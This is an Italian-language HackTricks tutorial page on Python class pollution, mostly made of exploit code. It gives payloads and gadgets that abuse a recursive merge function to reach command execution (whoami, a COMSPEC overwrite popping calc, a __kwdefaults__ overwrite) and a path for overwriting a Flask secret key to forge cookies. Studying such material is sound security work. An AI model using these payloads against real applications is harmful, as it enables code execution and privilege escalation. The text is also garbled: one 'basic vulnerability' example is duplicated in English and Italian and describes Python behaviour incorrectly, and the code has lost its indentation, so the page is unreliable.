# Inquinamento delle classi (Prototype Pollution di Python)

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) su GitHub.

</details>

## Esempio di base

Verifica come è possibile inquinare le classi degli oggetti con le stringhe:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Esempio di Vulnerabilità di Base

Consider the following Python code:

```python
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

person = Person("Alice", 25)
print(person.name)
```

This code defines a `Person` class with a constructor that takes in a `name` and an `age`. It then creates an instance of the `Person` class with the name "Alice" and age 25, and prints out the name of the person.

Now, let's say an attacker is able to modify the `Person` class definition and inject malicious code:

```python
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        self.__class__ = dict

person = Person("Alice", 25)
print(person.name)
```

In this modified code, the attacker has changed the `__class__` attribute of the `person` object to `dict`. This means that the `person` object is no longer an instance of the `Person` class, but rather a dictionary.

When the code tries to access the `name` attribute of the `person` object, it will raise an `AttributeError` because dictionaries do not have a `name` attribute. However, the code does not handle this error and will crash.

This is an example of class pollution, where an attacker is able to modify the class definition and change the behavior of the code. In this case, the attacker was able to change the `__class__` attribute of the object, but there are other ways to pollute classes as well.

## Esempio di Vulnerabilità di Base

Considera il seguente codice Python:

```python
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

person = Person("Alice", 25)
print(person.name)
```

Questo codice definisce una classe `Person` con un costruttore che prende un `name` e un `age`. Successivamente, viene creato un'istanza della classe `Person` con il nome "Alice" e l'età 25, e viene stampato il nome della persona.

Ora, supponiamo che un attaccante sia in grado di modificare la definizione della classe `Person` e iniettare del codice maligno:

```python
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
        self.__class__ = dict

person = Person("Alice", 25)
print(person.name)
```

In questo codice modificato, l'attaccante ha cambiato l'attributo `__class__` dell'oggetto `person` in `dict`. Ciò significa che l'oggetto `person` non è più un'istanza della classe `Person`, ma piuttosto un dizionario.

Quando il codice cerca di accedere all'attributo `name` dell'oggetto `person`, verrà generato un `AttributeError` perché i dizionari non hanno un attributo `name`. Tuttavia, il codice non gestisce questo errore e si bloccherà.

Questo è un esempio di class pollution, in cui un attaccante è in grado di modificare la definizione della classe e cambiare il comportamento del codice. In questo caso, l'attaccante è riuscito a cambiare l'attributo `__class__` dell'oggetto, ma ci sono anche altri modi per inquinare le classi.
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Esempi di Gadget

<details>

<summary>Creazione di un valore predefinito della proprietà di classe per RCE (subprocess)</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Inquinamento di altre classi e variabili globali tramite <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Esecuzione arbitraria di sottoprocessi</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Sovrascrittura di <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** è un attributo speciale di tutte le funzioni, secondo la [documentazione](https://docs.python.org/3/library/inspect.html) di Python, è un "mapping di eventuali valori predefiniti per i parametri **solo keyword**". Inquinando questo attributo ci permette di controllare i valori predefiniti dei parametri solo keyword di una funzione, questi sono i parametri della funzione che vengono dopo \* o \*args.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Sovrascrivere il segreto di Flask tra i file</summary>

Quindi, se puoi fare una class pollution su un oggetto definito nel file python principale del web ma **la cui classe è definita in un file diverso** rispetto a quello principale. Poiché per accedere a \_\_globals\_\_ nei payload precedenti è necessario accedere alla classe dell'oggetto o ai metodi della classe, sarai in grado di **accedere ai globals in quel file, ma non in quello principale**. \
Di conseguenza, **non sarai in grado di accedere all'oggetto globale dell'app Flask** che ha definito la **chiave segreta** nella pagina principale:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In questo scenario hai bisogno di un gadget per attraversare i file per arrivare a quello principale per **accedere all'oggetto globale `app.secret_key`** per cambiare la chiave segreta di Flask e poter [**aumentare i privilegi** conoscendo questa chiave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Un payload come questo [da questo writeup](https://ctftime.org/writeup/36082):

{% code overflow="wrap" %}
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
{% endcode %}

Utilizza questo payload per **cambiare `app.secret_key`** (il nome nella tua app potrebbe essere diverso) per poter firmare nuovi e più privilegiati cookie di Flask.

</details>

Controlla anche la seguente pagina per ulteriori gadget di sola lettura:

{% content-ref url="python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](python-internal-read-gadgets.md)
{% endcontent-ref %}

## Riferimenti

* [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
